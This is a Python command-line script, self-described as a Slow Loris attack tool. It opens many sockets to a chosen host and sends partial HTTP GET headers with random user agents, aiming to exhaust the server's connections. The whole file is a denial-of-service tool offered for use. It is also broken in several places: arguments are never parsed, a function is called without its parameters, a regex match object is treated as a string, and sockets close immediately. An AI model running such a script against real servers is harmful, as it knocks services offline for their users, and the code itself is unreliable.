import socket
import sys
import argparse
import random
import re

#arg parse stuff
parser = argparse.ArgumentParser(prog="sloris", description="Slow Loris Attack Script")

parser.add_argument("domain", help="Host")

#default 0 so the os picks the port
parser.add_argument("-p", "--port", type=int, default=8080, help="Port")

parser.add_argument("-a", "--alivetime", type=int, default=4, help="Keep Alive Time")

parser.add_argument("-s", "--socket", type=int, default=200, help="# of sockets")

#if its 1 or less then poop pants
if len(parser._get_args()) <= 1:
    parser.print_help()
    sys.exit(1)

#if no domain then poop pants
if not parser.domain:
    print("need to specify a host")
    parser.print_help()
    sys.exit(1)


#choose a random line from a file
def random_line(name):
    #choses a random line by splitting them and then choosing one
    with open(name) as f:
        lines = f.read().splitlines()
        return random.choice(lines)


#init and send for each socket
def sockInit(domain, extension):
    #using with as so no cleanup
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:

        #set the time out time default 4
        sock.settimeout(parser.alivetime)

        #no bind because you dont want the os to get confused
        sock.connect((domain, parser.port))

        #because of the splitting the extension will always be there
        #first line of the get request
        sock.send("GET {} HTTP/1.1\r\n".format(extension))

        #the host line
        sock.send("Host: {}\r\n".format(domain))

        #the user agent line
        #picks a random user agent and then puts it in
        sock.send("User-Agent: {}\r\n".format(random_line("useragents")))
            
        #accepted langs line
        sock.send("Accept-language: en-US, en\r\n")

#the part that does the actual logic except the arg stuff
def main():
    #matches the entire string for after the / in the domain
    extension = re.search(r"\/(.+)?", parser.domain)

    #deletes the extension and then leaves the domain
    domain = parser.domain.replace(extension, "")

    for i in range(parser.socket):
        print("socket #{}".format(i))
        sockInit()

main()

